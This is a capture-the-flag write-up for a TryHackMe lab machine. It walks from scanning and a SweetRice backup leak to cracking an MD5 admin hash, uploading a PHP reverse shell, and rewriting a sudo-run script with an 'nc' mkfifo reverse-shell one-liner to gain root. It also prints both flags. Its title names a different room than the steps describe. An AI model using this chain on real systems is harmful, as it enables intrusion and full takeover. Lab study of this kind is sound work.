Swatish Attaluri
Date: 04-06-2021
## Agent Sudo CTF - Tryhackme
### Machine IP: 10.10.183.50
#### Nmap scan
```bash

nmap -sV -sC -oN ports 10.10.50.0                                                                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-03 12:43 IST
Nmap scan report for 10.10.50.0
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.11 seconds

```
#### Gobuster
```bash
$ gobuster dir -u http://10.10.50.0/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt| tee gobuster

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.50.0/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/03 12:46:06 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 310] [--> http://10.10.50.0/content/]
```
/as                   (Status: 301) can be found after gobuster on /content.
After browsing to MACHINE_IP/content we see that the site is using a Content Management System(CMS) called "sweetrice".
```bash
$ searchsploit sweetrice               
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion                                   | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities                                | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download                                 | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload                                   | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure                                       | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forgery                              | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution         | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                     | php/webapps/14184.txt
-------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
The one with Backup Disclosure looks interesting as we did not find anything like login in gobuster.
Lets see if we can disclose anything from backup.
```bash
$ searchsploit -x php/webapps/40718.txt
Exploit: SweetRice 1.5.1 - Backup Disclosure
URL: https://www.exploit-db.com/exploits/40718
Path: /usr/share/exploitdb/exploits/php/webapps/40718.txt
File Type: ASCII text, with CRLF line terminators

Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip

```
It says we can find backup in /inc/mysql_backup. So we should browse to /content/inc/mysql_backup because content is the parent directory created to put the backup.
We find an sql file.
Lets download it.
In line 79, we find
"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb"
admin: manager 
password is  a hash. Lets use hash identifier to know what type of hash.
```bash
$hash-identifier 

HASH: 42f749ade7f9e195bf475f37a44cafcb

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

```
Let us use MD5 hash
-m 0 is to specify mode 0 which RAW-MD5
```bash
$ hashcat -m 0 hashidentify --wordlist /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================


Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

42f749ade7f9e195bf475f37a44cafcb:Password123     
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 42f749ade7f9e195bf475f37a44cafcb
Time.Started.....: Fri Jun  4 21:28:55 2021 (1 sec)
Time.Estimated...: Fri Jun  4 21:28:56 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   148.1 kH/s (0.47ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 33792/14344385 (0.24%)
Rejected.........: 0/33792 (0.00%)
Restore.Point....: 32768/14344385 (0.23%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: dyesebel -> redlips

Started: Fri Jun  4 21:28:51 2021
Stopped: Fri Jun  4 21:28:58 2021

```
Username : Manager
Decoded hash is: Password123
#### Gaining a reverse shell
We can  include a file into the server by using these credentials given by searchsploit.
Lets upload php-reverse-shell from ads tab and copy reverse-shell code into the code block and name it as "reverse".
Lets browse to /content/inc/ads/reversephp.php
```bash

 nc -lvnp 8888             
listening on [any] 8888 ...
connect to [10.17.6.214] from (UNKNOWN) [10.10.209.114] 44280
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 19:25:27 up  1:17,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ cd /home;ls
itguy
$ cd itguy
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public$
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```
#### Privilege Escalation
Lets see what commands we can run as sudo.
```bash
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

```
It seems like we can run perl on with sudo on a file backup.pl
Lets see what is in the file
```bash
$ cat backup.pl 
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
It seems like it runs a shell script copt.sh
Lets see it
```bash
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
rm /tmp/f -> removes file f
mkfifo /tmp/f -> creates a named pipe "f" for interprocess communication
cat /tmp/f | /bin/sh -i 2>&1 -> take output of /tmp/f as input for sh in interactive mode and redirect stderr to stdout
nc 192.168.0.190 5554 -> send the output of sh to nc on ip 192.168.0.190 on port 5554
This basically means we are getting a reverse shell again.
We just need to replace the ip with out machine ip and use nc on port 5554 on our machine.
We cannot use any text editor so we need to echo and send it to /etc/copy.sh
Also, we can write into copy.sh (use ``` ls -l /etc/copy.sh```)
Terminal1:
```bash
$ cat backup.pl 
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.6.214 5554 >/tmp/f" > /etc/copy.sh
$ sudo /usr/bin/perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory

```
Terminal2:
```bash
$ nc -lvnp 5554             
listening on [any] 5554 ...
connect to [10.17.6.214] from (UNKNOWN) [10.10.109.144] 51286
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
# pwd
/home/itguy
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```
#### Answers
```body
What is the user flag?
THM{63e5bce9271952aad1113b6f1ac28a07}

What is the root flag?
THM{6637f41d0177b6f37cb20d775124699f}
```
#perl
#bash 
#sql